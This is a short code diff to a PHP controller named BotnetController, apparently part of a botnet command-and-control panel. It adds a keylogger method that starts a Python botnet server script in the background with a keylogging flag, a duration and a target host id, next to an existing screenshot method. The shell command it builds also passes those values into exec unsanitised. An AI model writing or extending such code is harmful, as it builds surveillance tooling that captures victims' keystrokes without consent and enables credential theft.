@@ -196,6 +196,15 @@ class BotnetController extends Controller
         return $output;
     }
 
+    public function keylogger($uid, $time){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --keylogger --time ".$time." --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
     public function screenshot($uid){
         $path = env('PATH_PYTHON_EXECUTABLE');
 
